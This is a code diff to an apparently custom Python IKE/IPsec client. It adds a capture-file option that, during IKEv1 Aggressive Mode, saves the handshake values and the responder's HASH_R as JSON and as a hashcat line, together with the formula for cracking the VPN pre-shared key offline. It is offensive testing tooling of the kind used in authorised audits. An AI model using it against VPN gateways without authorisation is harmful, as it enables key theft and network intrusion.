@@ -11,6 +11,7 @@ import argparse
 import hashlib
 import hmac as _hmac
 import ipaddress
+import json
 import os
 import socket
 import struct
@@ -455,12 +456,13 @@ class IKEv1Config:
     encr:      str   = "aes-cbc-256"
     hash_alg:  str   = "sha1"       # hash for both PRF and auth
     dh_group:  int   = 14
-    psk:       str   = "secret"
-    id_local:  str   = ""
-    id_remote: str   = ""
-    lifetime:  int   = 28800        # seconds
-    timeout:   float = 5.0
-    verbose:   bool  = False
+    psk:          str   = "secret"
+    id_local:     str   = ""
+    id_remote:    str   = ""
+    lifetime:     int   = 28800        # seconds
+    timeout:      float = 5.0
+    verbose:      bool  = False
+    capture_file: str   = ""          # if set, save Aggressive Mode crack material here
 
     # resolved (filled by __post_init__)
     encr_alg:  V1EncrAlg = field(init=False)
@@ -1758,6 +1760,93 @@ class IKEv1Client:
 
     # ── Aggressive Mode ────────────────────────────────────────────────────
 
+    def _save_crack_material(self, path: str) -> None:
+        """
+        Write all key material needed to crack the PSK offline from an
+        IKEv1 Aggressive Mode capture.
+
+        The responder's HASH_R is transmitted in the clear in message 2.
+        To crack it, a candidate PSK p is tested by computing:
+          SKEYID   = prf(p,        Ni || Nr)
+          HASH_R'  = prf(SKEYID,   g^xr || g^xi || CKY-R || CKY-I || SAi_b || IDir_b)
+        If HASH_R' == HASH_R then p is the correct PSK.
+
+        Outputs:
+          <path>       — JSON file with all fields and the cracking formula
+          <path>.hc    — Single hashcat-compatible line (modes 5300 MD5 / 5400 SHA1)
+        """
+        hash_r   = getattr(self, "_pending_hash_r", None) or b""
+        sai_b    = self.sa_payload_bytes[4:]    # SA body: DOI | Situation | Proposal …
+        idir_b   = self.idr_payload_bytes[4:]   # ID body: type | reserved | value …
+
+        # hashcat mode: 5300 = IKE-PSK MD5, 5400 = IKE-PSK SHA1; others need custom scripts
+        _hc_modes = {"md5": 5300, "sha1": 5400}
+        hc_mode   = _hc_modes.get(self.cfg.hash_alg)
+        hc_note   = (
+            f"hashcat -m {hc_mode} <wordlist>"
+            if hc_mode
+            else f"No built-in hashcat mode for {self.cfg.hash_alg}; use john --format=IKE or a custom script"
+        )
+        # Standard hashcat IKE-PSK line: colon-separated hex fields
+        hc_line = ":".join([
+            self.cookie_i.hex(),
+            self.cookie_r.hex(),
+            self.nonce_i.hex(),
+            self.nonce_r.hex(),
+            self.dh_pub.hex(),
+            self.peer_dh_pub.hex(),
+            hash_r.hex(),
+        ])
+
+        record = {
+            "format_version": 1,
+            "exchange":       "IKEv1 Aggressive Mode PSK",
+            "target":         f"{self.cfg.host}:{self.cfg.port}",
+            "hash_algorithm": self.cfg.hash_alg,
+            "fields": {
+                "cky_i":   self.cookie_i.hex(),
+                "cky_r":   self.cookie_r.hex(),
+                "nonce_i": self.nonce_i.hex(),
+                "nonce_r": self.nonce_r.hex(),
+                "g_xi":    self.dh_pub.hex(),
+                "g_xr":    self.peer_dh_pub.hex(),
+                "sai_b":   sai_b.hex(),
+                "idir_b":  idir_b.hex(),
+                "hash_r":  hash_r.hex(),
+            },
+            "crack_formula": {
+                "SKEYID":  "prf(PSK,    nonce_i || nonce_r)",
+                "HASH_R":  "prf(SKEYID, g_xr || g_xi || cky_r || cky_i || sai_b || idir_b)",
+                "check":   "PSK is correct when HASH_R_computed == hash_r",
+                "prf":     f"HMAC-{self.cfg.hash_alg.upper()}",
+            },
+            "hashcat": {
+                "mode":        hc_mode,
+                "description": f"IKE-PSK {self.cfg.hash_alg.upper()}",
+                "line":        hc_line,
+                "usage":       hc_note,
+                "note":        "sai_b and idir_b are required for HASH_R computation "
+                               "but are not part of the standard hashcat line; "
+                               "they are stored above for use with custom scripts.",
+            },
+        }
+
+        # Write JSON
+        with open(path, "w") as fh:
+            json.dump(record, fh, indent=2)
+
+        # Write bare hashcat line alongside the JSON
+        hc_path = path if path.endswith(".hc") else path + ".hc"
+        with open(hc_path, "w") as fh:
+            fh.write(hc_line + "\n")
+
+        self.log.section("Aggressive Mode Crack Material")
+        self.log.info(f"JSON file : {path}")
+        self.log.info(f"Hashcat   : {hc_path}")
+        self.log.info(f"HASH_R    : {hash_r.hex()}")
+        self.log.info(f"Hash alg  : {self.cfg.hash_alg.upper()}  ({hc_note})")
+        self.log.info(f"HC line   : {hc_line}")
+
     def _aggressive_mode(self) -> None:
         """Run the 3-message IKEv1 Aggressive Mode exchange (RFC 2409 §5.4)."""
         # --- Message 1: SA + KE + Nonce + IDii ---
@@ -1786,6 +1875,9 @@ class IKEv1Client:
         # Key derivation (now have g^ir)
         self.log.set_phase("AGG-KEYS")
         self._derive_keys_v1()
+
+        if self.cfg.capture_file:
+            self._save_crack_material(self.cfg.capture_file)
 
         # --- Message 3: HASH_I (encrypted) ---
         self.log.set_phase("AGG-AUTH")
@@ -2443,6 +2535,9 @@ def build_parser() -> argparse.ArgumentParser:
                     help="Phase 1 exchange mode (default: main)")
     v1.add_argument("--lifetime", type=int, default=28800,
                     help="SA lifetime in seconds (default: 28800)")
+    v1.add_argument("--capture-file", default="", metavar="FILE",
+                    help="Aggressive Mode only: save HASH_R and all crack material to FILE "
+                         "(JSON) and FILE.hc (hashcat line). Not written by default.")
 
     # ── Shared auth / network ─────────────────────────────────────────────
     auth = p.add_argument_group("authentication")
@@ -2487,11 +2582,14 @@ def main() -> None:
                 psk       = args.psk,
                 id_local  = args.id_local,
                 id_remote = args.id_remote,
-                mode      = args.mode,
-                lifetime  = args.lifetime,
-                timeout   = args.timeout,
-                verbose   = args.verbose,
+                mode         = args.mode,
+                lifetime     = args.lifetime,
+                timeout      = args.timeout,
+                verbose      = args.verbose,
+                capture_file = args.capture_file,
             )
+            if args.capture_file and args.mode != "aggressive":
+                parser.error("--capture-file is only meaningful with --mode aggressive")
             client: IKEv1Client | IKEv2Client = IKEv1Client(cfg)
         else:
             cfg = IKEConfig(
